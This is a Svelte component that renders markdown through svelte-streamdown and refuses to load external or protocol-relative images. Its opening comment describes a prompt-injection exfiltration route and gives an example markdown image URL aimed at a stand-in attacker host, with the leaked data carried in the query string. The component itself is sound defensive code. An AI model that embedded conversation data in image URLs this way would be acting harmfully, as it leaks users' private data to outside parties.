<script lang="ts">
	import { Streamdown, type StreamdownProps } from 'svelte-streamdown';

	let { ...props }: StreamdownProps = $props();

	// Remote images never load: a prompt-injected model could encode conversation data in an image URL
	// (`![](https://attacker/x?d=...)`) and the browser would send it. Streamdown blocks absolute URLs
	// when no prefix is allowed; the only URLs that still reach the `image` snippet are path-relative,
	// and a protocol-relative `//host/x` starts with "/" too, so it is refused here.
	const sameOrigin = (src: string): boolean => src.startsWith('/') && !/^\/[\\/]/.test(src);
</script>

{#snippet image(p: { token: { href: string; text: string }; src?: string; alt?: string })}
	{@const src = p.src ?? p.token.href}
	{#if sameOrigin(src)}
		<img {src} alt={p.alt ?? p.token.text} class="max-w-full rounded-md" />
	{:else}
		<span
			data-streamdown-image-blocked
			class="inline-block rounded bg-muted px-2 py-0.5 text-sm text-muted-foreground"
			title="External images are not loaded"
		>
			[image not loaded: {p.alt || p.token.text || 'no description'}]
		</span>
	{/if}
{/snippet}

<Streamdown {...props} allowedImagePrefixes={[]} {image} />
